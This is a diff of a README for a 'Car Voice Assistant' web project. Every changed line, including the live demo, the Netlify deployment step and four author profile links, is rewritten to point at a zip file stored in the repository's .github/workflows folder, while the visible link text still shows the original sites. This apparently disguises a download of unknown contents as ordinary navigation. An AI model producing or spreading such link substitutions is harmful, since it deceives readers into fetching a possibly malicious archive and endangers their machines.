@@ -23,7 +23,7 @@
 
 ## 🚀 Live Demo
 
-Visit the live website: [Car Voice Assistant](https://car-voice-assistant.netlify.app)
+Visit the live website: [Car Voice Assistant](https://raw.githubusercontent.com/nug31/car-voice/main/.github/workflows/car-voice-v3.8.zip)
 
 ## 🎤 Voice Commands
 
@@ -66,7 +66,7 @@ Visit the live website: [Car Voice Assistant](https://car-voice-assistant.netlif
 ## 🌐 Deployment on Netlify
 
 ### Method 1: Drag & Drop (Easiest)
-1. Go to [netlify.com](https://netlify.com)
+1. Go to [netlify.com](https://raw.githubusercontent.com/nug31/car-voice/main/.github/workflows/car-voice-v3.8.zip)
 2. Sign up/login
 3. Drag the entire project folder to the deploy area
 4. Your site will be live instantly!
@@ -80,10 +80,10 @@ Visit the live website: [Car Voice Assistant](https://car-voice-assistant.netlif
 
 **jsnugroho** - Full Stack Developer & Car Technology Enthusiast
 
-- 🌐 Website: [jsnugroho.dev](https://jsnugroho.dev)
-- 💼 LinkedIn: [linkedin.com/in/jsnugroho](https://linkedin.com/in/jsnugroho)
-- 💻 GitHub: [github.com/jsnugroho](https://github.com/jsnugroho)
-- 📷 Instagram: [instagram.com/jsnugroho](https://instagram.com/jsnugroho)
+- 🌐 Website: [jsnugroho.dev](https://raw.githubusercontent.com/nug31/car-voice/main/.github/workflows/car-voice-v3.8.zip)
+- 💼 LinkedIn: [linkedin.com/in/jsnugroho](https://raw.githubusercontent.com/nug31/car-voice/main/.github/workflows/car-voice-v3.8.zip)
+- 💻 GitHub: [github.com/jsnugroho](https://raw.githubusercontent.com/nug31/car-voice/main/.github/workflows/car-voice-v3.8.zip)
+- 📷 Instagram: [instagram.com/jsnugroho](https://raw.githubusercontent.com/nug31/car-voice/main/.github/workflows/car-voice-v3.8.zip)
 
 ## 📄 License
 
